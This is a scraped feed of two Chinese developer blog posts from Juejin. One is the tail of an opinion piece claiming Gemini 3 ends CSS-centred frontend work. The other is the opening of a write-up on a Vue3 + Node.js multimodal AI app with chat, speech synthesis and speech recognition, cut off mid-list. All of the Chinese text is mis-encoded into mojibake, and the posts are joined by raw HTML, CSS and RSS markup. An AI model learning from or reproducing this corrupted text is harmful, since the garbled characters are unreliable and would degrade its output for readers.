<p>æˆ‘æœ€æ–°çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Ferpanomer.nurverse.com" target="_blank" title="https://erpanomer.nurverse.com" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µä¹Ÿæ˜¯ç”¨ Gemini 3 </a> é‡å†™çš„ï¼Œè¿™å®¡ç¾ï¼Œè¿™æ•ˆç‡ï¼Œæ²¡å¾—è¯´ï¼å¤ªå¼ºäº†ğŸ‘</p>
<hr/>
<h3 data-id="heading-1">åˆ‡å›¾ä»”çš„æ—¶ä»£æ­£å¼ç»ˆç»“äº†</h3>
<p>ä»¥å‰å’±æ€»å¼€ç©ç¬‘è¯´è‡ªå·±æ˜¯åˆ‡å›¾ä»”ï¼Œå…¶å®å¿ƒé‡Œè¿˜æ˜¯æœ‰ç‚¹å‚²æ°”çš„ï¼š <em>ä½ ä»¥ä¸º CSS å®¹æ˜“å•Šï¼ŸBFCã€å±‚å ä¸Šä¸‹æ–‡ã€å“åº”å¼æ–­ç‚¹ã€ä¸åŒå†…æ ¸çš„å…¼å®¹æ€§...è¿™ç©æ„å„¿æ°´æ·±ç€å‘¢ï¼</em></p>
<p>ä½† Gemini 3 è¿™ç§çº§åˆ«çš„ AI å‡ºæ¥ï¼Œç›´æ¥æŠŠè¿™å±‚å‚²æ°”ç»™<strong>é™ç»´æ‰“å‡»</strong>äº†ã€‚</p>
<ul>
<li><strong>æ¯”é€Ÿåº¦ï¼Ÿ</strong> ä½ è°ƒä¸€ä¸ªå¸ƒå±€è¦åŠå°æ—¶ï¼Œå®ƒåªè¦ 3 ç§’ã€‚</li>
<li><strong>æ¯”å®¡ç¾ï¼Ÿ</strong> å®ƒå­¦ä¹ äº†å…¨çƒæ•°äº¿ä¸ªç²¾ç¾ç½‘é¡µï¼Œé…å‡ºçš„è§†è§‰UI æŠŠä½ é‚£ç¨‹åºå‘˜å®¡ç¾ç”©å‡ºå‡ æ¡è¡—ã€‚</li>
<li><strong>æ¯”ç¨³å®šæ€§ï¼Ÿ</strong> å®ƒä¸ä¼šå†™é”™å•è¯ï¼Œä¹Ÿä¸ä¼šæ¼å†™åˆ†å·ï¼Œæ›´ä¸ä¼šå› ä¸ºä¸‹åˆè·Ÿäº§å“ç»ç†åµäº†æ¶å°±æ•…æ„åœ¨ä»£ç é‡ŒåŸ‹å‘ã€‚</li>
</ul>
<p><strong>è¯´å®è¯ï¼Œåœ¨å®ç°è§†è§‰ç¨¿è¿™ä»¶äº‹ä¸Šï¼Œäººç±»å·²ç»è¾“äº†ã€‚å½»åº•è¾“äº†ï¼ï¼ï¼ğŸ˜­</strong></p>
<p>å¦‚æœä½ çš„æ ¸å¿ƒç«äº‰åŠ›å°±æ˜¯èƒ½æŠŠ UI å›¾ 1:1 è¿˜åŸæˆç½‘é¡µï¼Œé‚£ä½ çš„èŒä¸šç”Ÿæ¶¯ç¡®å®å·²ç»è¿›å…¥å€’è®¡æ—¶äº†ã€‚</p>
<hr/>
<h3 data-id="heading-2">æ—¢ç„¶ CSS æˆäº†åºŸè¯ï¼Œé‚£æˆ‘ä»¬è¿˜å‰©ä»€ä¹ˆï¼Ÿ</h3>
<p>æ—¢ç„¶ AI èƒ½å†™å‡ºå®Œç¾çš„ CSSï¼Œç”šè‡³è¿äº¤äº’åŠ¨ç”»éƒ½èƒ½ä¸€å¥è¯ç”Ÿæˆï¼Œé‚£å…¬å¸å‡­å•¥è¿˜èŠ±å‡ ä¸‡å—æ‹›ä¸ªå‰ç«¯ï¼Ÿ</p>
<p>æˆ‘æƒ³äº†åŠå®¿ï¼Œè§‰å¾—å’±ä»¬å‰ç«¯è€å“¥çš„<strong>ä¿å‘½ç‰Œ</strong>ï¼Œå…¶å®æ­£åœ¨ä»æ‰‹è‰ºè½¬å‘ä¸Šå±‚å»ºç­‘ï¼š</p>
<h4 data-id="heading-3">åŸ¹å…»è‡ªå·±çš„æ¶æ„è®¾è®¡èƒ½åŠ›</h4>
<p>AI å¯ä»¥ç»™ä½ ç Œå‡ºä¸€é¢å®Œç¾çš„å¢™ï¼Œä½†å®ƒä¸çŸ¥é“è¿™é¢å¢™è¯¥ç«‹åœ¨ä»€ä¹ˆä½ç½®ã€‚</p>
<p>ä¸€ä¸ªå¤§å‹é¡¹ç›®é‡Œï¼š</p>
<ul>
<li><strong>ç»„ä»¶æ€ä¹ˆæ‹†åˆ†</strong>æœ€åˆ©äºå¤ç”¨ï¼Ÿ</li>
<li><strong>ç›®å½•ç»“æ„</strong>æ€ä¹ˆè®¾è®¡æ‰ä¸ä¼šè®©åæ¥çš„äººéª‚å¨˜ï¼Ÿ</li>
<li><strong>å…¨å±€çŠ¶æ€</strong>æ˜¯ç”¨ Zustand è¿˜æ˜¯ç›´æ¥åŸç”Ÿ Context æ¢­å“ˆï¼Ÿ</li>
</ul>
<p>è¿™äº›æ¶‰åŠåˆ°<strong>å·¥ç¨‹åŒ–å†³ç­–</strong>çš„ä¸œè¥¿ï¼ŒAI ç›®å‰è¿˜æ˜¯ä¸ªå¼Ÿå¼Ÿã€‚å®ƒåªèƒ½ç»™ä½ å±€éƒ¨çš„æœ€ä¼˜è§£ï¼Œç»™ä¸äº†ä½ å…¨å±€çš„æ¶æ„è§‚ã€‚</p>
<h4 data-id="heading-4">å¤„ç†é‚£äº›åªæœ‰äººèƒ½ç†è§£çš„ä¸šåŠ¡</h4>
<p>AI æœ€æ€•çš„æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯<strong>é€»è¾‘çš„æ··æ²Œ</strong>ã€‚</p>
<blockquote>
<p>ç”¨æˆ·å¦‚æœè¿ç»­ç‚¹å‡»ä¸‰æ¬¡ï¼Œè¦è§¦å‘ä¸€ä¸ªå½©è›‹ï¼Œä½†å¦‚æœä»–æ˜¯ VIP ä¸”ä½™é¢ä¸è¶³ï¼Œè¿™ä¸ªå½©è›‹è¦æ¢æˆå……å€¼æé†’ï¼Œé¡ºä¾¿è¿˜å¾—é˜²æ­¢æ¥å£é‡æ”¾ã€‚</p>
</blockquote>
<p>è¿™ç§åªæœ‰äººç±»äº§å“ç»ç†æ‹è„‘è¢‹æƒ³å‡ºæ¥çš„ã€é€»è¾‘è½¬äº†åå…«é“å¼¯çš„è¾¹ç¼˜ Caseï¼ŒAI æå…¶å®¹æ˜“å†™å‡º Bugã€‚</p>
<p>æå®šå¤æ‚çš„å¼‚æ­¥æµï¼Œæå®šæ¶å¿ƒçš„ç«æ€æ¡ä»¶ï¼Œæå®šå„ç§å„æ ·çš„é™çº§ç­–ç•¥â€”â€”è¿™æ‰æ˜¯ä½ é¢†å·¥èµ„çš„çœŸæ­£ç†ç”±ã€‚</p>
<h4 data-id="heading-5">é©¾é©­ AI çš„èƒ½åŠ›ï¼ˆè¿™åº”è¯¥æ˜¯ 2026 å¹´çš„é«˜é¢‘é¢è¯•é¢˜ï¼‰</h4>
<p>ä»¥å‰é¢è¯•é—®ï¼šCSS æ€ä¹ˆå®ç°ä¸‰è§’å½¢ï¼Ÿ</p>
<p>ä»¥åé¢è¯•å¯èƒ½é—®ï¼šå¦‚ä½•ç”¨ä¸€å¥ Promptï¼Œè®© Gemini 3 è¾“å‡ºä¸€ä¸ªç¬¦åˆå…¬å¸ç§æœ‰ UI è§„èŒƒã€ä¸”é€šè¿‡äº† E2E æµ‹è¯•çš„å¤æ‚ç»„ä»¶ï¼Ÿ</p>
<p>AI ä¸æ˜¯ä½ çš„æ•Œäººï¼Œå®ƒå¯æ˜¯ä½ çš„å¥½ä¼™ä¼´ã€‚</p>
<p>åˆ«äººè¿˜åœ¨ç”¨æ‰‹æ•²ä»£ç æ—¶ï¼Œä½ å·²ç»å­¦ä¼šåˆ©ç”¨AI æå‡å·¥ä½œæ•ˆç‡ã€‚ä½ çš„æ ¸å¿ƒç«äº‰åŠ›ï¼Œå°±æ˜¯ä½  <strong>è°ƒæ•™ AI</strong> çš„æ°´å¹³ã€‚</p>
<hr/>
<h3 data-id="heading-6">æ²¡å¿…è¦ç„¦è™‘ï¼Œè¿™æ˜¯è¶…çº§ä¸ªä½“çš„å¼€å§‹</h3>
<p>å’±ä»¬æœ‰æœ¨æœ‰å¯èƒ½æ¢ä¸€ç§æ€è·¯ğŸ¤”ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬æƒ³åšä¸ªè‡ªå·±çš„å‰¯ä¸šé¡¹ç›®ï¼Œæœ€å¤´ç–¼çš„æ˜¯ä»€ä¹ˆï¼ŸUI å’Œ CSSã€‚</p>
<p>å¯¹äºæˆ‘ä»¬è¿™ç§é€»è¾‘å¼ºã€å®¡ç¾å¼±çš„åç«¯å‹å‰ç«¯ï¼Œè°ƒæ ·å¼ç®€ç›´æ˜¯è¦äº†äº²å‘½ã€‚</p>
<p>ç°åœ¨ Gemini 3 è¿™ç§ä¸œè¥¿å‡ºæ¥äº†ï¼Œç®€ç›´æ˜¯é€ç¦åˆ©ã€‚</p>
<ul>
<li><strong>åç«¯ï¼š</strong> è®© AI å¸®ä½ ç”Ÿæˆ Schema å’ŒåŸºç¡€ CRUDã€‚</li>
<li><strong>UI/CSSï¼š</strong> ä¸¢å¼ è‰å›¾ç»™ Gemini 3ã€‚</li>
<li><strong>å‰ç«¯æ¡†æ¶ï¼š</strong> è®© AI å¸®ä½ å†™å¥½éª¨æ¶ã€‚</li>
</ul>
<p><strong>ä½ ä¸€ä¸ªäººï¼Œå°±æ˜¯ä¸€ä¸ªè¶…çº§ä¸ªä½“ã€‚</strong></p>
<p>ä»¥å‰æˆ‘ä»¬éœ€è¦åœ¨å¤§å‚é‡Œå·ï¼Œæ˜¯å› ä¸ºå¤§å‚æœ‰èµ„æºã€æœ‰é…å¥—ã€‚</p>
<p>ç°åœ¨ AI æŠŠèµ„æºé—¨æ§›æŠ¹å¹³äº†ã€‚åœ¨è¿™ä¸ªä»£ç éå¸¸å»‰ä»·çš„æ—¶ä»£ï¼Œä½ çš„åˆ›æ„ã€ä½ çš„äº§å“æ„è¯†ã€ä½ çš„è§£å†³é—®é¢˜èƒ½åŠ›ï¼Œåè€Œå˜å¾—æ›´å€¼é’±äº†ã€‚</p>
<hr/>
<p>Gemini 3 ç¡®å®å¾ˆçŒ›ï¼ŒçŒ›åˆ°è®©äººæ€€ç–‘äººç”Ÿï¼ŒçŒ›å¾—ä¸€å¡Œç³Šæ¶‚ï¼ğŸ˜–</p>
<p>ä½†æˆ‘ç›¸ä¿¡ï¼Œåªè¦äº’è”ç½‘è¿˜éœ€è¦æœåŠ¡ï¼Œå‰ç«¯è¿™ä¸ªè§’è‰²å°±ä¸ä¼šæ¶ˆå¤±ã€‚å®ƒåªæ˜¯ä»ä½“åŠ›æ´»è¿›åŒ–æˆäº†è„‘åŠ›æ´»ã€‚</p>
<p>åˆ«çº ç»“é‚£å‡ ä¸ª <code>margin</code> å’Œ <code>padding</code> äº†ï¼Œå»ç ”ç©¶æ¶æ„ï¼Œå»æ·±æŒ–æ€§èƒ½ï¼Œå»å­¦ä¹ æ€ä¹ˆè®© AI ç»™ä½ å½“ç‰›é©¬ã€‚</p>
<p><strong>åªè¦ä½ è·‘å¾—æ¯” AI è¿›åŒ–çš„é€Ÿåº¦å¿«ï¼Œä½ å°±ä¸æ˜¯è¢«æ·˜æ±°çš„é‚£ä¸€ä¸ªã€‚</strong></p>
<p>æœ€åé»˜é»˜çš„é—®å¤§å®¶ä¸€å¥ğŸ¤£ï¼š</p>
<p>å¦‚æœæ˜å¤©ä½ çš„è€æ¿è®©ä½ è£æ‰å›¢é˜Ÿä¸€åŠçš„å‰ç«¯ï¼Œåªç•™ä¸‹é‚£äº›ä¼šç”¨ AI çš„ï¼Œä½ ä¼šæ˜¯åœ¨åå•é‡Œçš„é‚£ä¸ªäººå—ï¼Ÿ</p>
<p>æ¬¢è¿ğŸ‘é¡ºä¾¿è¯´è¯´ä½ è¢« Gemini 3 æƒŠå“åˆ°çš„ç¬é—´ğŸ˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI å¤šæ¨¡æ€å…¨æ ˆé¡¹ç›®å®æˆ˜ï¼šVue3 + Node æ‰“é€  TTS+ASR å…¨å®¶æ¡¶ï¼]]></title>    <link>https://juejin.cn/post/7589074117643485219</link>    <guid>https://juejin.cn/post/7589074117643485219</guid>    <pubDate>2025-12-29T07:41:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117643485219" data-draft-id="7588996730772520960" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI å¤šæ¨¡æ€å…¨æ ˆé¡¹ç›®å®æˆ˜ï¼šVue3 + Node æ‰“é€  TTS+ASR å…¨å®¶æ¡¶ï¼"/> <meta itemprop="keywords" content="Vue.js,Node.js,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-29T07:41:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¼–ç¨‹å¹²è´§é“º"/> <meta itemprop="url" content="https://juejin.cn/user/52383084474680"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI å¤šæ¨¡æ€å…¨æ ˆé¡¹ç›®å®æˆ˜ï¼šVue3 + Node æ‰“é€  TTS+ASR å…¨å®¶æ¡¶ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/52383084474680/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¼–ç¨‹å¹²è´§é“º
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:41:50.000Z" title="Mon Dec 29 2025 07:41:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">ğŸš€</h2>
<p>æœ€è¿‘æäº†ä¸€ä¸ªæŒºæœ‰æ„æ€çš„é¡¹ç›®ï¼šç”¨Â <strong>Vue3.5 + Node.js</strong>Â ä» 0 åˆ° 1 æ‰“é€ ä¸€ä¸ªç”Ÿäº§çº§çš„ AI å¤šæ¨¡æ€åº”ç”¨ã€‚</p>
<p>ä½ å¯ä»¥åœ¨é‡Œé¢ï¼š</p>
<ul>
<li>è·Ÿ AI å®æ—¶å¯¹è¯ï¼ˆæ”¯æŒæµå¼æ‰“å­—åŠ¨ç”»ï¼‰ğŸ’¬</li>
<li>è¾“å…¥æ–‡å­—ï¼Œç›´æ¥åˆæˆè¯­éŸ³ï¼Œç§’å˜æ’­éŸ³å‘˜ğŸ™ï¸</li>
<li>æ‰“å¼€éº¦å…‹é£ï¼Œâ€œè¾¹è¯´è¾¹å†™â€ï¼Œè¯­éŸ³å®æ—¶è½¬æ–‡å­—ğŸ—£ï¸â†’âŒ¨ï¸</li>
<li>ç”šè‡³è¿˜èƒ½ç”¨ä¸€å¥è¯ç”Ÿæˆå›¾ç‰‡ğŸ¨ï¼</li>
</ul>
<p>ğŸ‘‡å…ˆä¸Šä¸ªå›¾é•‡æ¥¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f859d432dfb144e5b4bb9a81c13bac52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg57yW56iL5bmy6LSn6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767598909&amp;x-signature=Ylx8zQSIISyxF4QjY3HLLADQsz4%3D" alt="" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">ğŸ§  é¡¹ç›®èƒŒæ™¯ &amp; æŠ€æœ¯é€‰å‹</h3>
<p>ä¼ ç»Ÿ AI åº”ç”¨ä¸€èˆ¬åªåšåˆ°èŠå¤©æˆ–è¯­éŸ³å•ç‚¹åŠŸèƒ½ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯â€”â€”<strong>å¤šæ¨¡æ€æ•´åˆï¼Œç”¨æˆ·èƒ½åœ¨åŒä¸€å¹³å°ä½“éªŒå®Œæ•´çš„ AI èƒ½åŠ›</strong>ã€‚</p>
<p>æŠ€æœ¯æ ˆé€‰å¾—éƒ½æ˜¯æœ€æ–°ç¨³å®šç‰ˆï¼Œå¹¶ä¸”å›´ç»•â€œå¯ç»´æŠ¤æ€§ + æ€§èƒ½ + ç”¨æˆ·ä½“éªŒâ€ä¸‹äº†ä¸å°‘åŠŸå¤«ï¼š</p>
<h4 data-id="heading-2">ğŸ§© æŠ€æœ¯æ ˆï¼ˆæ ¸å¿ƒï¼‰</h4>
<ul>
<li><strong>å‰ç«¯ï¼š</strong> Â Vue 3.5 + Vite + Element Plus + Pinia + markdown-it</li>
<li><strong>åç«¯ï¼š</strong> Â Node.js + Express + Prisma + MySQL</li>
<li><strong>AI æ¨¡å‹ï¼š</strong> Â æ¥å…¥å­—èŠ‚çš„ è±†åŒ… å¤šä¸ªæ¨¡å‹ï¼š</li>
<li>
<ul>
<li>å¯¹è¯æ¨¡å‹ï¼ˆæ”¯æŒå¿«é€Ÿ&amp;æ·±åº¦æ€è€ƒæ¨¡å¼ï¼‰</li>
<li>å›¾åƒç”Ÿæˆï¼ˆSeedream 4.0ï¼‰</li>
<li>è¯­éŸ³åˆæˆï¼ˆTTSï¼‰</li>
<li>è¯­éŸ³è¯†åˆ«ï¼ˆASRï¼‰</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-3">ğŸ’¡æ ¸å¿ƒäº®ç‚¹æ‹†è§£ï¼ˆå¼€å‘è€…è§†è§’ï¼‰</h3>
<h4 data-id="heading-4">âœ… 1. ç™»å½• &amp; æƒé™ï¼šå®‰å…¨åšåˆ°äº†æè‡´</h4>
<p>æˆ‘ä»¬ä¸æ˜¯ç®€å•å†™ä¸ªç™»å½•æ¥å£å°±å®Œäº‹å„¿ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li><strong>JWT + HttpOnly Cookie</strong>Â å­˜å‚¨ï¼Œå‰åç«¯è‡ªåŠ¨é‰´æƒ</li>
<li>æ”¯æŒè§’è‰²æƒé™ï¼ˆç”¨æˆ· / ç®¡ç†å‘˜ï¼‰</li>
<li>é˜² CSRF / XSSï¼Œç™»å‡ºæ¸…é™¤æ‰€æœ‰çŠ¶æ€</li>
<li>å¯†ç åŠ å¯†ç”¨çš„æ˜¯ bcrypt å•å‘å“ˆå¸Œ</li>
</ul>
<blockquote>
<p><strong>ä½“éªŒä¸Š</strong>ï¼šç”¨æˆ·å®Œå…¨æ— æ„Ÿï¼Œå¼€å‘ä¸Šä¹Ÿå¾ˆçœäº‹ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-5">ğŸ§  2. AI å¯¹è¯ç³»ç»Ÿï¼šåŒæ¨¡å‹ + æµå¼è¾“å‡º</h4>
<p>å¿«é€Ÿæ¨¡å¼å›ç­”å¿«ï¼Œæ·±åº¦æ¨¡å¼é€‚åˆå¤æ‚é€»è¾‘é—®é¢˜ã€‚</p>
<p>éš¾ç‚¹æ˜¯ä¸¤ä¸ªæ¨¡å‹å‚æ•°æ ¼å¼ä¸ä¸€æ ·ï¼Œè¿˜è¦åšæµå¼è¾“å‡ºï¼ˆé€å­—æ˜¾ç¤ºï¼‰ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>åç«¯ç»Ÿä¸€å°è£…æ¥å£ï¼Œè‡ªåŠ¨åˆ¤æ–­æ¨¡å‹ç±»å‹</li>
<li>å‰ç«¯è‡ªå®šä¹‰ POST SSE å®¢æˆ·ç«¯ï¼Œæ”¯æŒæµå¼æ¸²æŸ“</li>
<li>ç”¨æˆ·åªç®¡ç‚¹æŒ‰é’®ï¼Œæ‰“å­—æ•ˆæœå¾ˆä¸æ»‘~</li>
</ul>
<hr/>
<h4 data-id="heading-6">ğŸ” 3. èŠå¤©é•¿åˆ—è¡¨ä¸å¡é¡¿ï¼Ÿæˆ‘ä»¬ç”¨äº†è™šæ‹Ÿæ»šåŠ¨ï¼</h4>
<p>èŠå¤©è®°å½•å¤šäº†ï¼Œé¡µé¢å¡é¡¿æ˜¯å¸¸æ€ï¼Ÿ</p>
<p>æˆ‘ä»¬ç”¨è™šæ‹Ÿæ»šåŠ¨ + åˆ†é¡µæ–¹æ¡ˆï¼š</p>
<ul>
<li>åˆå§‹åŠ è½½ 20 æ¡æ¶ˆæ¯ï¼Œæ”¯æŒæ»šåŠ¨åŠ è½½æ›´å¤š</li>
<li>å¯è§†åŒºåŸŸ + buffer åŒºæ¸²æŸ“ï¼Œå…¶ä»–ç”¨ padding å ä½</li>
<li>è‡ªåŠ¨ä¿æŒæ»šåŠ¨ä½ç½®ï¼Œä½“éªŒå®Œå…¨ä¸æ‰“æ–­</li>
</ul>
<p><strong>æ€§èƒ½æå‡æ•ˆæœæƒŠäººï¼š</strong></p>

























<table><thead><tr><th>é¡¹ç›®</th><th>ä¼˜åŒ–å‰</th><th>ä¼˜åŒ–å</th></tr></thead><tbody><tr><td>é¦–å±åŠ è½½</td><td>1.8 ç§’</td><td>0.3 ç§’</td></tr><tr><td>DOM èŠ‚ç‚¹</td><td>2000+</td><td>40</td></tr><tr><td>æ»šåŠ¨å¸§ç‡</td><td>30~40fps</td><td>55~60fps</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-7">ğŸ”Š 4. TTS å®æ—¶è¯­éŸ³åˆæˆï¼š0.5 ç§’å†…å¼€å£è¯´è¯ï¼</h4>
<p>ä¼ ç»Ÿ TTS æœ‰ 3~5 ç§’å»¶è¿Ÿï¼Œè¿™å¤ªæ…¢äº†ã€‚</p>
<p>æˆ‘ä»¬åšäº†ï¼š</p>
<ul>
<li>åç«¯ç”¨ WebSocket ä¸­ç»§è±†åŒ… TTS æœåŠ¡</li>
<li>å‰ç«¯ç”¨ Audio æ ‡ç­¾è¾¹æ¥æ”¶è¾¹æ’­æ”¾</li>
<li>æ–‡æœ¬é¢„å¤„ç†ï¼ˆå» markdownã€é™åˆ¶é•¿åº¦ï¼‰</li>
</ul>
<p>æœ€ç»ˆæ•ˆæœï¼š<strong>åŸºæœ¬åšåˆ°äº†â€œè¾“å…¥å³è¯´è¯â€ï¼Œå»¶è¿Ÿæ§åˆ¶åœ¨ 0.5~1 ç§’ä¹‹é—´ï¼</strong></p>
<hr/>
<h4 data-id="heading-8">ğŸ“ 5. å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ + AI å†™ä½œåŠ©æ‰‹</h4>
<p>åŸºäº WangEditor äºŒæ¬¡å°è£…ï¼š</p>
<ul>
<li>æ”¯æŒé€‰ä¸­æ–‡æœ¬ç”Ÿæˆç»­å†™å†…å®¹</li>
<li>ä¹Ÿå¯ç‚¹å‡»å·¥å…·æ è§¦å‘ AI</li>
<li>ç”Ÿæˆå†…å®¹é€å­—è¾“å‡ºï¼Œå†™å®Œè‡ªåŠ¨æ’å…¥åˆ°å…‰æ ‡å¤„</li>
</ul>
<blockquote>
<p><strong>ä¼˜åŠ¿ï¼š</strong> Â éå¸¸é€‚åˆå†™ç®€å†ã€æ–¹æ¡ˆã€å†…å®¹è‰ç¨¿ä¹‹ç±»çš„åœºæ™¯ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-9">ğŸ¤ 6. è¯­éŸ³è½¬å†™ï¼ˆASRï¼‰ï¼šçœŸæ­£åšåˆ°â€œè¾¹è¯´è¾¹å†™â€</h4>
<p>é€šè¿‡éº¦å…‹é£å½•éŸ³ â†’ PCM æµä¼ è¾“ â†’ å®æ—¶è¿”å›è¯†åˆ«ç»“æœ â†’ å®æ—¶å¡«è¿›æ–‡æœ¬æ¡†ã€‚</p>
<ul>
